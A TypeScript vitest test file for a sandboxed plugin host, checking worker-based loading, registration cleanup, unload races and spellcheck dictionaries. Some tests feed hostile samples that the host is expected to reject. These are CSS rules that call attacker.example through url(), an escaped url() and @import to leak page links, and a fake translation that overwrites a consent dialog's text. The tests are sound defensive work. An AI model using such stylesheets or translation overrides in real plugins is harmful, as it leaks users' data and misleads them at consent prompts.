import { describe, expect, it, vi } from "vitest";
import { fileTypes } from "@/lib/plugins/fileTypes";
import { createPluginHost, type PluginHost } from "@/lib/plugins/host";
import type { ModuleImporter } from "@/lib/plugins/loader";
import type { InstalledPlugin, PluginModule } from "@/lib/plugins/types";
import { clearDictionarySources, getDictionarySource } from "@/lib/spellcheck/dictionarySources";
import { FakeWorker } from "@/test/fakeWorker";
import { importerFor, installed } from "@/test/fixtures/pluginHost";

describe("sandboxed plugins", () => {
  /** Spawner that captures the FakeWorker and auto-activates unless told not to. */
  const spawnerFor =
    (worker: FakeWorker, autoActivate = true) =>
    () => {
      if (autoActivate) queueMicrotask(() => worker.emit({ type: "activated" }));
      return worker;
    };
  const boxed = (overrides: Partial<InstalledPlugin> = {}) =>
    installed({ sandbox: true, ...overrides });

  it("loads via the worker instead of importing the module", async () => {
    const worker = new FakeWorker();
    const host = createPluginHost(vi.fn(), undefined, undefined, undefined, spawnerFor(worker));
    const importer = vi.fn();

    await host.load(boxed(), importer as unknown as ModuleImporter);

    expect(importer).not.toHaveBeenCalled();
    expect(host.listLoaded().map((p) => p.id)).toEqual(["com.x.demo"]);
    expect(worker.posted[0]).toMatchObject({ type: "init", source: "export default …" });
  });

  it("routes worker registrations into the registries and removes them on unload", async () => {
    const worker = new FakeWorker();
    const notify = vi.fn();
    const host = createPluginHost(notify, undefined, undefined, undefined, spawnerFor(worker));

    await host.load(boxed());
    worker.emit({ type: "register-command", id: "c1", title: "Boxed cmd" });
    worker.emit({ type: "add-styles", css: ".x{}" });
    worker.emit({ type: "register-exporter", id: "e1", label: "E", extension: "txt" });
    worker.emit({ type: "register-site-theme", id: "t1", label: "T", css: "body{}" });
    worker.emit({ type: "register-color-scheme", id: "ocean", label: "Ocean", css: ":root{}" });
    worker.emit({ type: "notify", message: "hi from box" });

    expect(host.commands.list().map((c) => c.id)).toEqual(["c1"]);
    expect(host.commands.list().map((c) => c.pluginId)).toEqual(["com.x.demo"]);
    expect(host.styles.list().map((s) => s.css)).toEqual([".x{}"]);
    expect(host.exporters.list().map((e) => e.id)).toEqual(["e1"]);
    expect(host.exporters.list().map((e) => e.pluginId)).toEqual(["com.x.demo"]);
    expect(host.siteThemes.list().map((t) => t.id)).toEqual(["t1"]);
    expect(host.colorSchemes.list().map((s) => s.key)).toEqual(["com.x.demo:ocean"]);
    expect(notify).toHaveBeenCalledWith("hi from box");

    host.unload("com.x.demo");
    expect(host.commands.list()).toHaveLength(0);
    expect(host.styles.list()).toHaveLength(0);
    expect(host.exporters.list()).toHaveLength(0);
    expect(host.siteThemes.list()).toHaveLength(0);
    expect(host.colorSchemes.list()).toHaveLength(0);
    expect(worker.terminated).toBe(true);
  });

  it("persists settings-set through the backend one key at a time", async () => {
    const worker = new FakeWorker();
    const backend = { load: vi.fn().mockResolvedValue({ size: 12 }), save: vi.fn() };
    const host = createPluginHost(vi.fn(), undefined, undefined, backend, spawnerFor(worker));

    await host.load(boxed());
    // Snapshot before settings-set: the host hands the worker the hydrated object.
    expect((worker.posted[0] as { settings: unknown }).settings).toEqual({ size: 12 });

    worker.emit({ type: "settings-set", key: "theme", value: "dark" });
    expect(backend.save).toHaveBeenCalledWith("com.x.demo", "theme", "dark");
  });

  it("routes translations and answers workspace calls with permission gating", async () => {
    const worker = new FakeWorker();
    const translations = vi.fn();
    const host = createPluginHost(vi.fn(), translations, () => null, undefined, spawnerFor(worker));

    await host.load(boxed({ permissions: ["workspace:read"] }));
    worker.emit({
      type: "register-translations",
      locale: "fa",
      namespace: "com.x.demo",
      resources: {},
    });
    worker.emit({ type: "workspace-list", callId: 1 });

    expect(translations).toHaveBeenCalledWith("fa", "com.x.demo", {});
    // workspace:read granted but no workspace open: an error result, not a hang.
    await vi.waitFor(() =>
      expect(worker.posted).toContainEqual(
        expect.objectContaining({ type: "host-result", callId: 1, ok: false }),
      ),
    );
  });

  it("keeps a plugin out of the app's translation namespaces", async () => {
    const worker = new FakeWorker();
    const translations = vi.fn();
    const errors = vi.spyOn(console, "error").mockImplementation(() => {});
    const host = createPluginHost(vi.fn(), translations, () => null, undefined, spawnerFor(worker));

    await host.load(boxed());
    // The consent dialog and the external-link prompt read these bundles, and
    // a registration overwrites existing keys.
    for (const namespace of ["plugins", "common", "menu", "ai"]) {
      worker.emit({
        type: "register-translations",
        locale: "en",
        namespace,
        resources: { consentFullTrustBody: "Routine update." },
      });
    }
    worker.emit({
      type: "register-translations",
      locale: "en",
      namespace: "com.x.demo.panel",
      resources: {},
    });

    expect(translations).toHaveBeenCalledTimes(1);
    expect(translations).toHaveBeenCalledWith("en", "com.x.demo.panel", {});
    expect(errors).toHaveBeenCalledTimes(4);
    errors.mockRestore();
  });

  it("drops a sandboxed stylesheet that would make requests", async () => {
    const worker = new FakeWorker();
    const errors = vi.spyOn(console, "error").mockImplementation(() => {});
    const host = createPluginHost(vi.fn(), undefined, undefined, undefined, spawnerFor(worker));

    await host.load(boxed());
    // The worker's fetch is fenced; a selector on an attribute plus url()
    // would report the page's links and paths to any host.
    worker.emit({
      type: "add-styles",
      css: 'a[href^="https://internal"]{background:url(https://attacker.example/l)}',
    });
    worker.emit({ type: "add-styles", css: '@import "https://attacker.example/x.css";' });
    worker.emit({ type: "add-styles", css: ".x{color:red}" });

    expect(host.styles.list().map((s) => s.css)).toEqual([".x{color:red}"]);
    expect(errors).toHaveBeenCalledTimes(2);
    errors.mockRestore();
  });

  it("drops a sandboxed color scheme that would make requests or is malformed", async () => {
    const worker = new FakeWorker();
    const errors = vi.spyOn(console, "error").mockImplementation(() => {});
    const host = createPluginHost(vi.fn(), undefined, undefined, undefined, spawnerFor(worker));

    await host.load(boxed());
    const scheme = (id: string, css: string) =>
      worker.emit({ type: "register-color-scheme", id, label: "Scheme", css });
    scheme("leaky", ':root{background:url("https://attacker.example/l")}');
    scheme("escaped", ':root{background:\\75rl("https://attacker.example/e")}');
    scheme("imported", '@import "https://attacker.example/x.css";');
    scheme("", ":root{}");
    scheme("ocean", ":root{--color-bg:#012}");

    expect(host.colorSchemes.list().map((s) => s.key)).toEqual(["com.x.demo:ocean"]);
    expect(errors).toHaveBeenCalledTimes(4);
    errors.mockRestore();
  });

  it("rolls back what a plugin registered before its activation failed", async () => {
    clearDictionarySources();
    const worker = new FakeWorker();
    const host = createPluginHost(vi.fn(), undefined, undefined, undefined, () => worker);

    const loading = host.load(boxed());
    await vi.waitFor(() => expect(worker.onmessage).not.toBeNull());
    worker.emit({ type: "register-dictionary", language: "en", label: "English" });
    worker.emit({ type: "register-command", id: "c1", title: "Boxed cmd" });
    const dictionary = getDictionarySource("en")?.load();
    worker.emit({ type: "error", message: "broken plugin" });

    await expect(dictionary).rejects.toThrow("stopped");
    await expect(loading).rejects.toThrow("broken plugin");
    // A leaked "en" would hide the bundled English for the rest of the session.
    expect(getDictionarySource("en")).toBeUndefined();
    expect(host.commands.list()).toHaveLength(0);
    expect(host.listLoaded()).toHaveLength(0);
    expect(worker.terminated).toBe(true);
  });

  it("settles the calls the worker owed when the host unmounts, and ignores it afterwards", async () => {
    clearDictionarySources();
    const worker = new FakeWorker();
    const notify = vi.fn();
    const backend = { load: vi.fn().mockResolvedValue({}), save: vi.fn() };
    const host = createPluginHost(notify, undefined, undefined, backend, spawnerFor(worker));

    await host.load(boxed());
    worker.emit({ type: "register-dictionary", language: "en", label: "English" });
    worker.emit({ type: "register-exporter", id: "e1", label: "E", extension: "txt" });
    const dictionary = getDictionarySource("en")?.load();
    const exported = host.exporters.list()[0].build("<p/>", { title: "", css: "", dark: false });
    host.unloadAll();

    await expect(dictionary).rejects.toThrow("stopped");
    await expect(exported).rejects.toThrow("stopped");
    expect(getDictionarySource("en")).toBeUndefined();

    worker.emit({ type: "notify", message: "still here" });
    worker.emit({ type: "settings-set", key: "theme", value: "dark" });
    expect(notify).not.toHaveBeenCalled();
    expect(backend.save).not.toHaveBeenCalled();
  });

  it("a newer load stops the activation it supersedes, and that one's failure leaves it alone", async () => {
    const first = new FakeWorker();
    const second = new FakeWorker();
    const workers = [first, second];
    const host = createPluginHost(
      vi.fn(),
      undefined,
      undefined,
      undefined,
      () => workers.shift() as FakeWorker,
    );

    const superseded = host.load(boxed());
    await vi.waitFor(() => expect(first.onmessage).not.toBeNull());
    first.emit({ type: "register-command", id: "a", title: "Old" });
    const replacing = host.load(boxed({ version: "2.0.0" }));
    expect(first.terminated).toBe(true);
    expect(host.commands.list()).toHaveLength(0);
    await vi.waitFor(() => expect(second.onmessage).not.toBeNull());
    second.emit({ type: "activated" });
    await expect(replacing).resolves.toBe(true);
    second.emit({ type: "register-command", id: "b", title: "New" });

    first.emit({ type: "error", message: "broken plugin" });
    await expect(superseded).resolves.toBe(false);
    expect(host.commands.list().map((c) => c.id)).toEqual(["b"]);
    expect(host.listLoaded().map((p) => p.version)).toEqual(["2.0.0"]);
    expect(second.terminated).toBe(false);
  });

  describe("unloaded while activating", () => {
    /** Load until the worker is up and has registered one of everything, then stop. */
    async function loadUntilRegistered(stop: (host: PluginHost, worker: FakeWorker) => void) {
      clearDictionarySources();
      const worker = new FakeWorker();
      const host = createPluginHost(vi.fn(), undefined, undefined, undefined, () => worker);
      const loading = host.load(boxed());
      await vi.waitFor(() => expect(worker.onmessage).not.toBeNull());
      worker.emit({ type: "register-command", id: "c1", title: "Boxed cmd" });
      worker.emit({ type: "add-styles", css: ".x{}" });
      worker.emit({ type: "register-exporter", id: "e1", label: "E", extension: "txt" });
      worker.emit({ type: "register-file-type", extensions: ["boxed"], language: "boxed" });
      worker.emit({ type: "register-dictionary", language: "en", label: "English" });
      const dictionary = getDictionarySource("en")?.load();
      stop(host, worker);
      return { worker, host, loading, dictionary };
    }

    const expectNothingRegistered = (host: PluginHost) => {
      expect(host.commands.list()).toHaveLength(0);
      expect(host.styles.list()).toHaveLength(0);
      expect(host.exporters.list()).toHaveLength(0);
      expect(fileTypes.list()).toHaveLength(0);
      expect(getDictionarySource("en")).toBeUndefined();
      expect(host.listLoaded()).toHaveLength(0);
    };

    it.each([
      ["unload", (host: PluginHost) => host.unload("com.x.demo")],
      ["unloadAll", (host: PluginHost) => host.unloadAll()],
    ])("%s removes its registrations and stops its worker at once", async (_, stop) => {
      // The worker never reports activated: an untrusted activate can hang.
      const { worker, host, loading, dictionary } = await loadUntilRegistered(stop);

      expectNothingRegistered(host);
      expect(worker.terminated).toBe(true);
      await expect(dictionary).rejects.toThrow("stopped");
      await expect(loading).resolves.toBe(false);
    });

    it.each([{ type: "activated" }, { type: "error", message: "late" }] as const)(
      "ignores a $type the worker sends afterwards",
      async (late) => {
        const { worker, host, loading, dictionary } = await loadUntilRegistered((h) =>
          h.unload("com.x.demo"),
        );

        worker.emit({ type: "register-command", id: "c2", title: "Late" });
        worker.emit(late);

        await expect(dictionary).rejects.toThrow("stopped");
        await expect(loading).resolves.toBe(false);
        expectNothingRegistered(host);
      },
    );

    it("leaves a newer load of the same plugin to activate", async () => {
      const first = new FakeWorker();
      const second = new FakeWorker();
      const workers = [first, second];
      const host = createPluginHost(
        vi.fn(),
        undefined,
        undefined,
        undefined,
        () => workers.shift() as FakeWorker,
      );

      const stale = host.load(boxed());
      await vi.waitFor(() => expect(first.onmessage).not.toBeNull());
      first.emit({ type: "register-command", id: "old", title: "Old" });
      host.unload("com.x.demo");
      const fresh = host.load(boxed({ version: "2.0.0" }));
      await vi.waitFor(() => expect(second.onmessage).not.toBeNull());
      second.emit({ type: "register-command", id: "new", title: "New" });
      second.emit({ type: "activated" });
      await expect(fresh).resolves.toBe(true);

      first.emit({ type: "activated" });
      await expect(stale).resolves.toBe(false);
      expect(host.commands.list().map((c) => c.id)).toEqual(["new"]);
      expect(host.listLoaded().map((p) => p.version)).toEqual(["2.0.0"]);
      expect(second.terminated).toBe(false);
    });

    it("stops a worker that activated in the same tick as the unload", async () => {
      const { worker, host, loading, dictionary } = await loadUntilRegistered((h, w) => {
        w.emit({ type: "activated" });
        h.unload("com.x.demo");
      });

      await expect(dictionary).rejects.toThrow("stopped");
      await expect(loading).resolves.toBe(false);
      expectNothingRegistered(host);
      expect(worker.terminated).toBe(true);
    });

    it("spawns no worker when unloaded while its settings are read", async () => {
      let settingsRead!: (settings: Record<string, unknown>) => void;
      const backend = {
        load: () => new Promise<Record<string, unknown>>((resolve) => (settingsRead = resolve)),
        save: vi.fn(),
      };
      const spawn = vi.fn(() => new FakeWorker());
      const host = createPluginHost(vi.fn(), undefined, undefined, backend, spawn);

      const loading = host.load(boxed());
      host.unload("com.x.demo");
      settingsRead({});

      await expect(loading).resolves.toBe(false);
      expect(spawn).not.toHaveBeenCalled();
    });
  });
});

describe("spellcheck dictionary contributions", () => {
  it("registers through the plugin's bag and unload removes the dictionary", async () => {
    clearDictionarySources();
    const host = createPluginHost(vi.fn());
    const module: PluginModule = {
      activate(ctx) {
        ctx.spellcheck.registerDictionary({
          language: "fa",
          label: "Persian",
          load: () => Promise.resolve({ aff: "AFF", dic: "DIC" }),
        });
      },
    };

    await host.load(installed(), importerFor(module));
    expect(getDictionarySource("fa")?.label).toBe("Persian");

    host.unload("com.x.demo");
    expect(getDictionarySource("fa")).toBeUndefined();
  });
});
